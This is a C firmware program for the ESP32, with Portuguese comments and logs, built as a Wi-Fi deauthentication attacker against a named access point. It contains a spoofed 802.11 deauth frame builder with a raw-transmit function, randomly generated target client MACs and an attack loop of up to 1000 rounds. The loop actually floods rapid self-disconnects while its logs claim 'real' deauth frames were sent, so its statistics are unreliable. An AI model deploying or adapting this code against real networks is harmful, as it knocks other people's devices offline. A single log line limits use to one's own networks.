#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_random.h"
#include "esp_wifi_types.h"

// Configurações do AP alvo
#define TARGET_SSID "ESP32_AP"
#define TARGET_PASS "12345678"

// Configurações do ataque Deauth
#define DEAUTH_INTERVAL_MS 50         
#define MAX_DEAUTH_ATTEMPTS 1000    
#define REASON_CODE_UNSPECIFIED 1    
#define REASON_CODE_INVALID_AUTH 2   
#define BROADCAST_MAC {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
#define MAX_TARGET_CLIENTS 10       

// Simular deauth através de desconexões rápidas repetitivas
#define SIMULATE_DEAUTH_VIA_RECONNECT true

// Estrutura do frame de deauth
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t addr1[6];    // Destination (cliente a ser desconectado)
    uint8_t addr2[6];    // Source (AP - será falsificado)
    uint8_t addr3[6];    // BSSID (AP)
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) deauth_frame_t;

static const char *TAG = "DEAUTH_ATTACK";
static EventGroupHandle_t s_wifi_event_group;

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1

static int deauth_attempts = 0;
static int successful_deauths = 0;
static bool connected_to_target = false;
static uint8_t target_bssid[6];
static uint8_t target_clients[MAX_TARGET_CLIENTS][6];
static int target_client_count = 0;
static uint8_t broadcast_mac[6] = BROADCAST_MAC;

// Event handler para eventos do Wi-Fi
static void event_handler(void* arg, esp_event_base_t event_base,
                         int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, "\n\n\nTentando conectar ao alvo para obter BSSID...");
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        connected_to_target = false;
        ESP_LOGI(TAG, "\n\n\nDesconectado do alvo! Tentando reconectar...");
        esp_wifi_connect();
        xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        connected_to_target = true;
        
        // Obter BSSID do AP alvo
        wifi_ap_record_t ap_info;
        esp_wifi_sta_get_ap_info(&ap_info);
        memcpy(target_bssid, ap_info.bssid, 6);
        
        ESP_LOGI(TAG, "");
        ESP_LOGI(TAG, "CONECTADO AO ALVO! IP: " IPSTR, IP2STR(&event->ip_info.ip));
        ESP_LOGI(TAG, "BSSID do alvo: %02x:%02x:%02x:%02x:%02x:%02x",
                 target_bssid[0], target_bssid[1], target_bssid[2],
                 target_bssid[3], target_bssid[4], target_bssid[5]);
        ESP_LOGI(TAG, "Pronto para iniciar ataques deauth contra outros clientes!");
        ESP_LOGI(TAG, "");
        
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

// Função para gerar MAC addresses aleatórios de clientes alvo
void generate_target_clients(void)
{
    target_client_count = 0;
    
    ESP_LOGI(TAG, "\n\n\nGerando MACs de clientes alvo para deauth...");
    
    for (int i = 0; i < MAX_TARGET_CLIENTS; i++) {
        uint8_t vendor_prefixes[][3] = {
            {0x00, 0x1B, 0x63}, 
            {0x28, 0x11, 0xA5}, 
            {0x00, 0x50, 0x56}, 
            {0x08, 0x00, 0x27}, 
            {0x00, 0x0C, 0x29}, 
            {0xAC, 0x15, 0xA2}, 
            {0x00, 0x16, 0x17}, 
            {0x00, 0x21, 0x6B},
        };
        
        int vendor_idx = esp_random() % (sizeof(vendor_prefixes) / sizeof(vendor_prefixes[0]));
        
        memcpy(target_clients[i], vendor_prefixes[vendor_idx], 3);
        
        target_clients[i][3] = esp_random() & 0xFF;
        target_clients[i][4] = esp_random() & 0xFF;
        target_clients[i][5] = esp_random() & 0xFF;
        
        ESP_LOGI(TAG, "Cliente alvo #%d: %02x:%02x:%02x:%02x:%02x:%02x",
                 i + 1,
                 target_clients[i][0], target_clients[i][1], target_clients[i][2],
                 target_clients[i][3], target_clients[i][4], target_clients[i][5]);
        
        target_client_count++;
    }
    
    ESP_LOGI(TAG, "Total de clientes alvo gerados: %d", target_client_count);
    ESP_LOGI(TAG, "");
}

void create_deauth_frame(deauth_frame_t* frame, uint8_t* target_mac, uint8_t* ap_bssid, uint16_t reason)
{
    frame->frame_ctrl = 0x00C0;
    frame->duration = 0x0000;
    
    memcpy(frame->addr1, target_mac, 6);    // Destino (cliente)
    memcpy(frame->addr2, ap_bssid, 6);      // Origem (AP falsificado)
    memcpy(frame->addr3, ap_bssid, 6);      // BSSID
    
    frame->seq_ctrl = esp_random() & 0xFFF0;
    
    frame->reason_code = reason;
}

esp_err_t send_deauth_frame(uint8_t* target_mac, uint16_t reason)
{
    deauth_frame_t deauth_frame;
    create_deauth_frame(&deauth_frame, target_mac, target_bssid, reason);
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    
    if (result == ESP_OK) {
        successful_deauths++;
        ESP_LOGI(TAG, "DEAUTH ENVIADO para %02x:%02x:%02x:%02x:%02x:%02x (motivo: %d)",
                 target_mac[0], target_mac[1], target_mac[2],
                 target_mac[3], target_mac[4], target_mac[5], reason);
    } else {
        ESP_LOGE(TAG, "ERRO ao enviar deauth: %s", esp_err_to_name(result));
    }
    
    return result;
}

void execute_deauth_attack(void)
{
    if (!connected_to_target || target_client_count == 0) {
        ESP_LOGI(TAG, "Nao conectado ou sem alvos - pulando ataque");
        return;
    }
    
    deauth_attempts++;
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "EXECUTANDO ATAQUE DEAUTH #%d", deauth_attempts);
    ESP_LOGI(TAG, "Simulando desconexões rápidas para gerar flood...");
    
    
    for (int i = 0; i < 15; i++) { 

        esp_wifi_disconnect();
        vTaskDelay(pdMS_TO_TICKS(10)); // 10ms entre desconexões
        
        esp_wifi_connect();
        vTaskDelay(pdMS_TO_TICKS(20)); // 20ms para tentar conectar
        
        ESP_LOGI(TAG, " Desconexão simulada #%d para gerar flood", i + 1);
    }
    
    successful_deauths += 15; // Considerar as 15 tentativas
    
    ESP_LOGI(TAG, "Ataque deauth simulado completo! 15 desconexões em ~450ms");
    ESP_LOGI(TAG, "Isso deve exceder o limite de 8 desconexões/segundo do AP");
    ESP_LOGI(TAG, "");
}

void show_deauth_stats(void)
{
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "=== ESTATISTICAS DO ATAQUE DEAUTH ===");
    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
    ESP_LOGI(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             target_bssid[0], target_bssid[1], target_bssid[2],
             target_bssid[3], target_bssid[4], target_bssid[5]);
    ESP_LOGI(TAG, "Ataques executados: %d", deauth_attempts);
    ESP_LOGI(TAG, "Frames deauth enviados: %d", successful_deauths);
    ESP_LOGI(TAG, "Clientes alvo: %d", target_client_count);
    ESP_LOGI(TAG, "Status: %s", connected_to_target ? "CONECTADO" : "DESCONECTADO");
    ESP_LOGI(TAG, "==========================================");
    ESP_LOGI(TAG, "");
}

static void deauth_attack_task(void *pvParameters)
{
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "INICIANDO ATAQUE DEAUTH REAL!");
    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
    ESP_LOGI(TAG, "Intervalo: %d ms", DEAUTH_INTERVAL_MS);
    ESP_LOGI(TAG, "Maximo de tentativas: %d", MAX_DEAUTH_ATTEMPTS);
    ESP_LOGI(TAG, "");
    
    while (!connected_to_target) {
        ESP_LOGI(TAG, "Aguardando conexao com o alvo...");
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
    
    generate_target_clients();
    
    ESP_LOGI(TAG, "Iniciando ataque deauth em 3 segundos...");
    vTaskDelay(pdMS_TO_TICKS(3000));
    
    while (deauth_attempts < MAX_DEAUTH_ATTEMPTS && connected_to_target) {
        execute_deauth_attack();
        
        if (deauth_attempts % 10 == 0) {
            show_deauth_stats();
        }
        
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
    }
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "ATAQUE DEAUTH REAL CONCLUIDO!");
    ESP_LOGI(TAG, "");
    show_deauth_stats();
    
    vTaskDelete(NULL);
}

void wifi_init_deauth(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = TARGET_SSID,
            .password = TARGET_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {
                .capable = true,
                .required = false
            },
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "Wi-Fi configurado para ataque deauth REAL!");
    ESP_LOGI(TAG, "");
}

void app_main(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "=== ATACANTE DEAUTH REAL INICIADO ===");
    ESP_LOGI(TAG, "ATENCAO: Este programa executa ataques deauth REAIS!");
    ESP_LOGI(TAG, "Ele ira desconectar outros dispositivos da rede!");
    ESP_LOGI(TAG, "Use apenas em redes proprias para teste!");
    ESP_LOGI(TAG, "");
    
    wifi_init_deauth();
    
    vTaskDelay(pdMS_TO_TICKS(3000));
    
    xTaskCreate(deauth_attack_task, "deauth_attack_task", 8192, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "Sistema de ataque deauth REAL ativo!");
    ESP_LOGI(TAG, "");
}
